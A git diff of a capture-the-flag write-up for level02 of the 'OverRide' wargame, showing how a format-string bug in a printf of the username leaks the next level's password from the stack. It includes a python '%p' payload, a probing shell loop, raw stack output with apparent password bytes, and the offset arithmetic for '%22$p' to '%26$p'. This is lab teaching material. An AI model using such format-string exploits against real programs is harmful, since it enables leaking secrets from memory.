@@ -7,45 +7,30 @@ level02@OverRide:~$ ./level02
 --[ Password:
 *****************************************
  does not have access!
- 
-# We start by reading the asm
-
-(gdb) x /s 0x400bb0
-0x400bb0:	 "r"
-(gdb) x /s 0x400bb2
-0x400bb2:	 "/home/users/level03/.pass"
-4008a8:	e8 53 fe ff ff       	callq  400700 <fopen@plt>
-
-400818:    48 81 ec 20 01 00 00     sub    $0x120,%rsp # taille de la stack 288
-400909:    48 8d 85 60 ff ff ff     lea    -0xa0(%rbp),%rax # emplacement du read -> .pass
 
 # The prog open the file containing the pass and save it in the stack
 
-# When the prog is called, it print with a printf the username
---[ Username: coucou
---[ Password: cou
+# When the prog is called, it print printf the username
+--[ Username: quoicou
+--[ Password: b
 *****************************************
-coucou does not have access!
+quoicou does not have access!
 
-400a96:	48 8d 45 90          	lea    -0x70(%rbp),%rax
-400a9a:	48 89 c7             	mov    %rax,%rdi
-400a9d:	b8 00 00 00 00       	mov    $0x0,%eax
-400aa2:	e8 19 fc ff ff       	callq  4006c0 <printf@plt>
 
-# We try a format attack string on this printf because the printf only take a string stored at -0x70(%rbp)
+
+# We try a format attack string on this printf
 https://owasp.org/www-community/attacks/Format_string_attack
 
 # We test
---[ Username: %p
---[ Password:
-*****************************************
-0x7fffffffe4c0 does not have access!
+python -c 'print "aaaaaaaa" + "%p " * 50' | ./level02
 
-# We script to find the content of our print in the stack
-for i in {0..50}; do python -c "print 'aaaa %$i\$x'" | ./level02 | grep 'access!'; done
+--[ Username: --[ Password: *****************************************
+aaaaaaaa0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 
+0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) 0x100000000 
+(nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x6161616161616161 0x7025207025207025 
+0x2520702520702520  does not have access!
 
-# At the 28 pos, we find our aaaa hex
-aaaa 61616161 does not have access!
+# we find our aaaaaaaa at positon 28
 
 # SO, 0xa0 (where .pass is stored) | 0x70 (where our username stored)
 >>> 0x70
@@ -55,8 +40,8 @@ aaaa 61616161 does not have access!
 
 0xa0 - 0x70 = 48
 
-# Since the stack is 8 bytes aligned, we can find the start of the .pass buffer at 28 - (48/8) = 22 in our print
-# We know the .pass to be 40 bytes long 40 / 8 = 5
+# As we see the stack is 8 bytes aligned, we can find the start of the .pass buffer at 28 - (48/8) = 22 in our print
+# We know the .pass to be 40 bytes long 40 / 8 = 5 (size read and flag format)
 # We have to print %22$p %23$p %24$p %25$p %26$p to get it all.
 
 level02@OverRide:~$ ./level02 
